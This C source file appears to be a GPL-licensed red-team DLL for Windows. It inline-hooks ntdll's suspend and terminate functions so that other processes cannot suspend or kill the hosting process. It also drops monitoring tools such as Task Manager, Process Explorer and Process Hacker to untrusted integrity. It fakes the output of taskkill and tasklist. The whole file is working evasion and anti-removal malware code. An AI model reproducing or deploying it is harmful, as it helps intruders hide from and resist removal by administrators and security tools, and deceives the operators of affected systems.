// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#define WINVER 0x0501
#define _WIN32_WINNT 0x0501

#define NOWH
#define NOMB
#define NOGDI
#define NOMSG
#define NONLS
#define NOMCX
#define NOIME
#define NOHELP
#define NOCOMM
#define NOICONS
#define NOCRYPT
#define NOKANJI
#define NOSOUND
#define NOCOLOR
#define NOMENUS
#define NOCTLMGR
#define NOMINMAX
#define NOSCROLL
#define NODRAWTEXT
#define NOMETAFILE
#define NOPROFILER
#define NOKEYSTATES
#define NORASTEROPS
#define NOCLIPBOARD
#define NOWINSTYLES
#define NOSYSMETRICS
#define NOWINOFFSETS
#define NOSHOWWINDOW
#define NOTEXTMETRIC
#define NOSYSCOMMANDS
#define NOGDICAPMASKS
#define NOWINMESSAGES
#define NODEFERWINDOWPOS
#define NOVIRTUALKEYCODES
#define WIN32_LEAN_AND_MEAN

#define UNICODE
#define EXPORT __declspec(dllexport)

#include <ntstatus.h>
#include <securitybaseapi.h>
#include <stdio.h>
#include <strsafe.h>
#include <wchar.h>
#include <windows.h>
#include <winnt.h>
#include <winternl.h>
#include <winver.h>

#define SIZE_A 10
#define SIZE_B 17
#define SIZE_C 2
#define SIZE_D 1
#define SIZE_JUMP 5
// #define SIZE_PATCH 19
#define SIZE_PATCH 14

typedef struct hook {
    HANDLE mutex;
    LPVOID target;
    unsigned char orig[SIZE_JUMP];
    unsigned char patch[SIZE_JUMP];
} hook;
typedef struct LANG {
    WORD wLanguage;
    WORD wCodePage;
} LANG_INFO;
typedef long long ptr;
typedef NTSTATUS(NTAPI *funcNtTerminateProcess)(HANDLE, NTSTATUS);

HANDLE mutexGlobal;

unsigned char jump[SIZE_PATCH] = {
    0x90,                                                       // nop
    0x49, 0xBB, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, // movabs r11,<val>
    0x41, 0x53,                                                 // push r11
    0xC3,                                                       // ret
};

/* Older version
unsigned char jump[SIZE_PATCH] = {
    0x90, // nop
    0x49, 0x89, 0xC3, // mv r11,rax
    0x48, 0xB8, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, // mv rax,<val>
    0x50, // push rax
    0x49, 0x8B, 0xC3, // mv rax,r11
    0xC3, // ret
};
*/

const char *targetsA[SIZE_A] = {
    "taskmgr.exe\0",
    "procexp.exe\0",
    "tcpview.exe\0",
    "procmon.exe\0",
    "procmon86.exe\0",
    "procmon32.exe\0",
    "procexp64.exe\0",
    "procexpx64.exe\0",
    "processhacker.exe\0",
    "processhacker2.exe\0",
};
const char *targetsB[SIZE_B] = {
    "slui.exe\0",
    "lsass.exe\0",
    "wermgr.exe\0",
    "spoolsv.exe\0",
    "svchost.exe\0",
    "DLLHost.exe\0",
    "LogonUI.exe\0",
    "regedit.exe\0",
    "consent.exe\0",
    "explorer.exe\0",
    "iexplore.exe\0",
    "rundll32.exe\0",
    "werfault.exe\0",
    "winlogon.exe\0",
    "taskhost.exe\0",
    "taskhostex.exe\0",
    "ServerManager.exe\0"};
const char *targetsC[SIZE_C] = {
    "taskmgr.exe\0",
    "powershell.exe\0"};
const char *targetsD[SIZE_D] = {
    "Process Hacker\0"};

hook NtSuspendThreadHook;
hook NtSuspendProcessHook;
hook NtTerminateProcessHook;

funcNtTerminateProcess NtTerminateProcess;

NTSTATUS NTAPI NtSuspendProcessFunc(HANDLE);
NTSTATUS NTAPI NtSuspendThreadFunc(HANDLE, PULONG);
NTSTATUS NTAPI NtTerminateProcessFunc(HANDLE, NTSTATUS);

int IsExclude(int, WCHAR[MAX_PATH]);
int IsProcName(int, WCHAR *, int, const char *);

DWORD DoUntrust(void) {
    Sleep(500);
    HANDLE t;
    if (!OpenProcessToken(GetCurrentProcess(), 0x200A8, &t)) {
        return 0;
    }
    SID a;
    DWORD c = 32;
    if (!CreateWellKnownSid(0x41, NULL, &a, &c)) {
        CloseHandle(t);
        return 0;
    }
    SID_AND_ATTRIBUTES b;
    b.Sid = &a;
    b.Attributes = 0x20;
    SetTokenInformation(t, 0x19, &b, c + 4);
    CloseHandle(t);
}

int IsProcByVersion(WCHAR s[MAX_PATH]) {
    DWORD n = GetFileVersionInfoSizeW(s, 0);
    if (n == 0) {
        return FALSE;
    }
    LPVOID b = (LPVOID)calloc(n, 1);
    if (b == NULL) {
        return FALSE;
    }
    if (!GetFileVersionInfoW(s, 0, n, b)) {
        free(b);
        return FALSE;
    }
    UINT c;
    LANG_INFO *l;
    if (!VerQueryValueW(b, L"\\VarFileInfo\\Translation", (LPVOID *)&l, &c)) {
        free(b);
        return FALSE;
    }
    UINT x;
    WCHAR *d;
    WCHAR v[255];
    for (int i = 0; i < (c / sizeof(LANG_INFO)); i++) {
        if (FAILED(StringCchPrintfW(v, 255, L"\\StringFileInfo\\%04x%04x\\FileDescription", l[i].wLanguage, l[i].wCodePage))) {
            continue;
        }
        if (!VerQueryValueW(b, v, (LPVOID *)&d, &x) || x == 0) {
            continue;
        }
        for (int k = 0; k < SIZE_D; k++) {
            if (IsProcName(x - 1, d, strlen(targetsD[i]), targetsD[i])) {
                free(b);
                return TRUE;
            }
        }
    }
    free(b);
    return FALSE;
}
int IsUntrust(int sn, WCHAR s[MAX_PATH]) {
    for (int i = 0; i < SIZE_A; i++) {
        if (IsProcName(sn, s, strlen(targetsA[i]), targetsA[i])) {
            return TRUE;
        }
    }
    if (IsExclude(sn, s)) {
        return FALSE;
    }
    return IsProcByVersion(s);
}
int IsExclude(int sn, WCHAR s[MAX_PATH]) {
    for (int i = 0; i < SIZE_B; i++) {
        if (IsProcName(sn, s, strlen(targetsB[i]), targetsB[i])) {
            return TRUE;
        }
    }
    return FALSE;
}
int IsHookTerminate(int sn, WCHAR s[MAX_PATH]) {
    if (IsUntrust(sn, s)) {
        return TRUE;
    }
    for (int i = 0; i < SIZE_C; i++) {
        if (IsProcName(sn, s, strlen(targetsC[i]), targetsC[i])) {
            return TRUE;
        }
    }
    return FALSE;
}
int IsProcName(int srcLen, WCHAR *src, int findLen, const char *find) {
    if (findLen > srcLen) {
        return FALSE;
    }
    for (int i = 1; findLen - i >= 0 && srcLen - i >= 0; i++) {
        if (tolower(find[findLen - i]) == tolower(src[srcLen - i])) {
            continue;
        }
        return FALSE;
    }
    return TRUE;
}

ptr Find(int size, ptr module, ptr func) {
    SIZE_T n;
    int c = 0;
    unsigned char b[1024];
    for (ptr x = module; x < func + 65535; x += 1024) {
        if (ReadProcessMemory(GetCurrentProcess(), (LPVOID)x, b, 1024, &n) == 0) {
            return 0;
        }
        for (int i = 0; i < n; i++) {
            if (b[i] == 0x90 || b[i] == 0xCC) {
                if (c >= size + 1) {
                    return x + i - size;
                }
                c++;
                continue;
            }
            c = 0;
        }
    }
    return 0;
}

void Redo(hook *h) {
    SIZE_T n;
    WriteProcessMemory(GetCurrentProcess(), h->target, h->patch, SIZE_JUMP, &n);
    ReleaseMutex(h->mutex);
}
void Undo(hook *h) {
    if (h->mutex == NULL || h->target == 0) {
        return;
    }
    WaitForSingleObject(h->mutex, INFINITE);
    SIZE_T n;
    WriteProcessMemory(GetCurrentProcess(), h->target, h->orig, SIZE_JUMP, &n);
}
void Hook(hook *h, HANDLE mod, FARPROC func, ptr replacement) {
    if (mod == NULL || func == NULL || replacement == 0) {
        return;
    }
    ptr b = Find(SIZE_PATCH, (ptr)mod, (ptr)func);
    if (b == 0) {
        return;
    }
    SIZE_T n;
    h->target = (LPVOID)func;
    DWORD p;
    VirtualProtect(h->target, SIZE_JUMP, PAGE_EXECUTE_READWRITE, &p);
    if (ReadProcessMemory(GetCurrentProcess(), h->target, h->orig, SIZE_JUMP, &n) == 0 || n != SIZE_JUMP) {
        h->target = 0;
        return;
    }
    if (h->orig[0] == 0xE9) {
        h->target = 0;
        return;
    }
    WaitForSingleObject(mutexGlobal, INFINITE);
    jump[10] = (replacement >> 56) & 0xFF;
    jump[9] = (replacement >> 48) & 0xFF;
    jump[8] = (replacement >> 40) & 0xFF;
    jump[7] = (replacement >> 32) & 0xFF;
    jump[6] = (replacement >> 24) & 0xFF;
    jump[5] = (replacement >> 16) & 0xFF;
    jump[4] = (replacement >> 8) & 0xFF;
    jump[3] = replacement & 0xFF;
    VirtualProtect((LPVOID)b, SIZE_PATCH, PAGE_EXECUTE_READWRITE, &p);
    if (WriteProcessMemory(GetCurrentProcess(), (LPVOID)b, jump, SIZE_PATCH, &n) == 0 || n != SIZE_PATCH) {
        ReleaseMutex(mutexGlobal);
        return;
    }
    ptr d = (b - 4) - (ptr)func;
    h->patch[4] = (d >> 24) & 0xFF;
    h->patch[3] = (d >> 16) & 0xFF;
    h->patch[2] = (d >> 8) & 0xFF;
    h->patch[1] = d & 0xFF;
    h->patch[0] = 0xE9;
    DWORD r = WriteProcessMemory(GetCurrentProcess(), h->target, h->patch, SIZE_JUMP, &n);
    ReleaseMutex(mutexGlobal);
    if (r == 0 || n != SIZE_JUMP) {
        return;
    }
    h->mutex = CreateMutex(NULL, FALSE, NULL);
}

EXPORT BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID args) {
    if (r != DLL_PROCESS_ATTACH) {
        return TRUE;
    }
    DisableThreadLibraryCalls(h);
    WCHAR s[MAX_PATH];
    DWORD n = GetModuleFileNameW(NULL, (LPWSTR)s, MAX_PATH);
    if (n == 0) {
        return TRUE;
    }
    if (IsExclude(n, s)) {
        return FALSE;
    }
    if (IsProcName(n, s, 12, "taskkill.exe\0")) {
        printf("SUCCESS\n\0");
        ExitProcess(0);
        return TRUE;
    }
    if (IsProcName(n, s, 12, "tasklist.exe\0")) {
        printf("Image Name                     PID Session Name        Session#    Mem Usage\n\0");
        printf("========================= ======== ================ =========== ============\n\0");
        printf("System Idle Process              0 Services                   0          0 K\n\0");
        printf("System                           4 Services                   0          0 K\n\0");
        printf("smss.exe                         0 Services                   0          0 K\n\0");
        printf("csrss.exe                        0 Console                    0          0 K\n\0");
        printf("duck.exe                        -1 Services                   1          0 K\n\0");
        printf("wininit.exe                      0 Services                   0          0 K\n\0");
        printf("never_gonna                     10 Console                    1          0 K\n\0");
        printf("give_you_up                     11 Console                    1          0 K\n\0");
        printf("never_gonna                     12 Console                    1          0 K\n\0");
        printf("let_you_down                    13 Console                    1          0 K\n\0");
        printf("never_gonna                     14 Console                    1          0 K\n\0");
        printf("run_around                      15 Console                    1          0 K\n\0");
        printf("and_hurt_you                    16 Console                    1          0 K\n\0");
        printf("never_gonna                     17 Console                    1          0 K\n\0");
        printf("say_goodbye                     18 Console                    1          0 K\n\0");
        printf("never_gonna                     19 Console                    1          0 K\n\0");
        printf("see_you_cry                     20 Console                    1          0 K\n\0");
        ExitProcess(0);
        return TRUE;
    }
    if (IsProcName(n, s, 11, "notepad.exe\0")) {
        return TRUE;
    }
    if (IsUntrust(n, s)) {
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DoUntrust, NULL, 0, NULL);
    }
    HANDLE a = LoadLibraryW(L"ntdll.dll");
    Hook(&NtSuspendProcessHook, a, GetProcAddress(a, "NtSuspendProcess"), (ptr)&NtSuspendProcessFunc);
    if (IsHookTerminate(n, s)) {
        Hook(&NtSuspendThreadHook, a, GetProcAddress(a, "NtSuspendThread"), (ptr)&NtSuspendThreadFunc);
        NtTerminateProcess = (funcNtTerminateProcess)GetProcAddress(a, "NtTerminateProcess");
        Hook(&NtTerminateProcessHook, a, (FARPROC)NtTerminateProcess, (ptr)&NtTerminateProcessFunc);
    }
    return TRUE;
}

NTSTATUS NTAPI NtSuspendProcessFunc(HANDLE h) {
    return 0;
}
NTSTATUS NTAPI NtSuspendThreadFunc(HANDLE h, PULONG x) {
    return 0;
}
NTSTATUS NTAPI NtTerminateProcessFunc(HANDLE h, NTSTATUS x) {
    if (GetProcessId(h) != GetCurrentProcessId()) {
        return 1;
    }
    Undo(&NtTerminateProcessHook);
    NTSTATUS r = NtTerminateProcess(h, x);
    Redo(&NtTerminateProcessHook);
    return r;
}
